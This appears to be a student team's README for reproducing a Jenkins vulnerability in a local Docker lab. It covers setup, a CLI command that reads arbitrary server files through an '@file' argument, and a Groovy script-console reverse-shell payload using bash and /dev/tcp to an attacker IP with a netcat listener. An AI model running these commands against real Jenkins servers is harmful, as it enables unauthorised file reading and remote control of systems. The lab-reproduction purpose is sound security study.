# CVE2_Jenkins_RCE
 Repo for CVE S2 Team 1 -- working on a Jenkins exploit

# Setting Up Jenkins
- Run "docker-compose build && docker-compose up -d"
- Navigate to http://localhost:8080, you will be prompted for an admin password
- Open a shell in the jenkins docker container (NOT THE POSTGRES ONE)
    - "docker exec -it <container_id> bash"
    - cd to directory listeed on the Jenkins page, acquire the password
- Set up a basic admin account (remember the password) and install default plugins 
-Configure anonymous users with basic permissions by going to Manage Jenkins > Security 
	- Set authorization type to "Matrix-based"
	- Allow anonymous users to read "Overall" and "Job"


#  Recreating the PoC
- Place a dummy file in the Jenkins system by opening a shell in the docker container (save the root path)
- Downloaded CLI client using "curl -O http://localhost:8080/jnlpJars/jenkins-cli.jar"  
- Execute "java -jar jenkins-cli.jar -s http://localhost:8080/ help @<TARGET_FILE_PATH>"
- If successful, you should get an error message "ERROR: No such command" followed by the file content


# Executing a reverse shell
- In your machine's terminal, start a netcat listener with `nc -l <port_num>` (replace <port_num> with any unused port number)
- You must obtain your computer's IP address as seen by Docker. On Mac you can find this with the command `ipconfig getifaddr en0`
- Assuming your Jenkins server is running, go to `[http://localhost:8080/script](http://localhost:8080/script)`. Log in as the admin account if you have not already.
- Paste and execute this payload into the Groovy script console: `['bash', '-c', 'bash -i >& /dev/tcp/<attacker_ip>/<port_num> 0>&1'].execute()`
- Go back to the terminal with the netcat listener. You should be in the Jenkins server's file system and able to do anything the admin user can.
